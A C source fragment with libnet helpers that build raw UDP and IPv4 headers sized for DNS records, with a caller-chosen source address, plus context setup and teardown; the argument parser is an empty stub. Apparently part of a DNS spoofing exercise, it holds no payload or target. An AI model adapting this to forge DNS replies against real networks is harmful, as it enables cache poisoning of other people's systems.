
libnet_ptag_t makeUDPHeader(struct UDPHeaderOptions options) {
	uint16_t CHECKSUM = 0;
	libnet_ptag_t ptag = 0;

	ptag = libnet_build_udp(
		options.base.sourcePort,
		options.base.destinationPort,
		LIBNET_UDP_H + LIBNET_UDP_DNSV4_H + options.recordsLength,
		CHECKSUM,
		NULL_PAYLOAD,
		NULL_PAYLOAD_SIZE,
		options.libnet.context,
		options.ptag
	);
	if (ptag == -1) {
		fprintf(stderr, "Error could not create UDP header.\n Libnet Error: %s", libnet_geterror(options.libnet.context));
		exit(EXIT_FAILURE);
	}
	return ptag;
}

libnet_ptag_t makeIPHeader(struct IPv4HeaderOptions options) {
	uint8_t TYPE_OF_SERVICE = 0;
	uint16_t ID = 0;
	uint16_t FRAGMENTATION = 0;
	uint8_t TTL = 64;
	uint8_t PROTOCOL = IPPROTO_UDP;
	uint16_t CHECKSUM = 0;
	libnet_ptag_t PTAG = 0;

	libnet_ptag_t ptag = libnet_build_ipv4(
		LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_UDP_DNSV4_H + options.recordsLength,
		TYPE_OF_SERVICE,
		ID,
		FRAGMENTATION,
		TTL,
		PROTOCOL,
		CHECKSUM,
		options.base.networkOrderedIPs.source,
		options.base.networkOrderedIPs.destination,
		NULL_PAYLOAD,
		NULL_PAYLOAD_SIZE,
		options.libnet.context,
		PTAG
	);
	if (ptag == -1) {
		fprintf(stderr, "Error: Could not create IPv4 Header.\n Libnet Error: %s", libnet_geterror(options.libnet.context));
		exit(EXIT_FAILURE);
	}
	return ptag;
}

void parseArguments(int part, int argc, char* argv[]) {
	switch (part)
	{
	case 1:
		break;
	case 2:
		break;
	case 3:
		break;
	case 4:
		break;
	default:
		abort();
	}
}

struct Libnet makeLibnet() {
	struct Libnet libnet = { NULL, NULL };
	libnet.errorBuffer = calloc(LIBNET_ERRBUF_SIZE, sizeof(char));
	libnet.context = libnet_init(
		LIBNET_RAW4,
		"enp0s8",
		libnet.errorBuffer);

	if (!libnet.context) {
		fprintf(stderr, "Could not initiate libnet: %s\n", libnet.errorBuffer);
		exit(EXIT_FAILURE);
	}
	return libnet;
}

void destroyLibnetContext(struct Libnet libnet) {
	libnet_destroy(libnet.context);
	free(libnet.errorBuffer);
	return;
}

